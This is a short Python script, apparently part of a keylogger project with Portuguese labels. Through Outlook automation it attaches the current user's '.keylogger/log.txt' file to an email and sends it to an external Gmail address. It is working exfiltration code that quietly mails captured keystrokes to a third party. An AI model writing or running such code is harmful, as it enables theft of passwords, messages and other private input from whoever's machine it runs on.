from time import sleep
import win32com.client as win32
import getpass

usuario = getpass.getuser()

outlook = win32.Dispatch('outlook.application')

email = outlook.CreateItem(0)

email.To = 'vicctor1009@gmail.com'
email.Subject = 'Testes finais'
email.HTMLBody = '''
<p>Anexo do log txt</p>
'''
anexo = f"C://Users/{usuario}/.keylogger/log.txt"

email.Attachments.Add(anexo)

email.Send()
